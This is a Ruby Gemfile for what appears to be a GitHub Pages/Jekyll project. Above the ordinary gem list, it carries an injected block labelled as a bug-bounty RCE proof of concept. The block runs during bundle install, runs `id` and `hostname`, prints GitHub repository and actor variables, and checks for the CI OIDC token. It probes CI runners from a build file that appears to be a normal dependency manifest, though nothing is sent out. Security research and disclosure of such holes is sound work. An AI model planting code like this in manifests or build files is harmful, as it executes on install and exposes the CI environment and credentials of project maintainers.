source "https://rubygems.org"

# BBP RCE PoC - Ruby code executes during bundle install
warn "=== RCE_PROOF START ==="
warn "runner_user=#{`id`.strip}"
warn "hostname=#{`hostname`.strip}"
warn "repo=#{ENV['GITHUB_REPOSITORY']}"
warn "actor=#{ENV['GITHUB_ACTOR']}"
warn "token_present=#{ENV.key?('ACTIONS_ID_TOKEN_REQUEST_TOKEN')}"
warn "=== RCE_PROOF END ==="

gem "faraday", "2.14.1"
gem "faraday-retry", "2.4.0"
gem "github-pages", "~> 232", group: :jekyll_plugins
gem "json", "2.19.4"
gem "language_server-protocol", "3.17.0.5"
gem "nokogiri", "~> 1.19.2"
gem "rake", "13.4.2"
gem "rubocop", "1.86.1"

group :test do
  gem "fastimage"
  gem "httparty"
  gem "minitest"
  gem "octokit"
  gem "pry", require: false
  gem "rubocop-performance"
  gem "safe_yaml"
end

group :development do
  gem "webrick"
end